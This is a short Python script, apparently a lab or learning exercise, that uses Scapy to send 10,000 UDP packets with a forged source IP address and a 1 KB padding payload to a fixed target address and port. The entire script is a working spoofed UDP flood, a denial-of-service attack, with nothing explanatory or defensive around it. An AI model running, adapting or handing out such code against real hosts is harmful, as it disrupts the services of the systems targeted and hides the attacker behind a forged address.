from scapy.all import *
import random
def udp_flood(spoofed_ip, target_ip, packet_count):
    target_port = 65535
    payload = "X" * 1024
    packet = IP(dst=target_ip, src=spoofed_ip)/UDP(dport=target_port)/payload
    for i in range(packet_count):
        send(packet)
        print(f"Packet UDP {i + 1} send to {target_ip}:{target_port}")

target_ip = "172.30.40.70"
spoofed_ip = "172.30.40.72"
packet_count = 10000
udp_flood(spoofed_ip, target_ip, packet_count)